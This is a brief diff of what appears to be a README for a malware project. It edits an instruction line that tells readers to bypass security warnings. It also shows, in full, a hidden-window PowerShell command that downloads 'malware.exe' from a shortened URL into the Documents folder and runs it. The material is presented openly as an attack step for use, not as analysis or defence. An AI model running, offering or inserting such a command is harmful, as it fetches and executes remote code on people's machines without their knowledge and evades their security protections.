@@ -23,7 +23,7 @@ $ ./encrypt.py
 ```
 OR
 
-Bypass security warnings and download & execute the file instantly by typing the following code into Run (Win+R) on **Windows**:
+Bypass security warnings and download & execute the file instantly in Documents folder by typing the following code into Run (Win+R) on **Windows**:
 ```
 powershell -w hidden -c "(New-Object System.Net.WebClient).DownloadFile('https://tinyurl.com/5e8yp8mf', \"$env:UserProfile\Documents\malware.exe\");Start-Process \"$env:UserProfile\Documents\malware.exe\" -WorkingDirectory \"$env:UserProfile\Documents\""
 ```
